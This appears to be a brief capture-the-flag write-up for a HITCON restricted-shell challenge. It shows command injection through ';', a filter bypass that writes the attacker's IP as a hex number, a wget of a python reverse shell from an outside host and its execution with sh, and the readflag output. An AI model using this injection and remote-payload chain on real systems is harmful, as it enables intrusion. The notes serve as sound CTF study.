@@ -1,0 +1,37 @@
+Filter: $ { } [ ] - \ / < > | " ' * ? ! @ &, more than 1 .
+
+help
+	Available Commands:
+	pwd ls mkdir netstat sort printf exit help id mount df du find history touch
+	
+ls ; help
+	Built-in commands:
+------------------
+        . : [ [[ alias bg break cd chdir command continue echo eval exec
+        exit export false fg getopts hash help history jobs kill let
+        local printf pwd read readonly return set shift source test times
+        trap true type ulimit umask unalias unset wait [ [[ acpid adjtimex
+        ar arp arping ash awk basename blkdiscard blockdev brctl bunzip2
+        bzcat bzip2 cal cat chgrp chmod chown chpasswd chroot chvt clear
+        cmp cp cpio crond crontab cttyhack cut date dc dd deallocvt depmod
+        devmem df diff dirname dmesg dnsdomainname dos2unix dpkg dpkg-deb
+        du dumpkmap dumpleases echo ed egrep env expand expr factor fallocate
+        false fatattr fdisk fgrep find fold free freeramdisk fsfreeze
+        fstrim ftpget ftpput getopt getty grep groups gunzip gzip halt
+        head hexdump hostid hostname httpd hwclock i2cdetect i2cdump
+        i2cget i2cset id ifconfig ifdown ifup init insmod ionice ip ipcalc
+        ipneigh kill killall klogd last less link linux32 linux64 linuxrc
+        ln loadfont loadkmap logger login logname logread losetup ls...
+        sh .... wget...
+
+name python3 reverse shell `index.html`
+
+ls ; wget 0x8c71188f (140.113.24.143)
+ls ; sh index.html
+	get reverse shell
+
+ls /
+	... flag ... readflag
+
+/readflag
+	hitcon{i_Am_s0_m155_s3e11sh0ck}
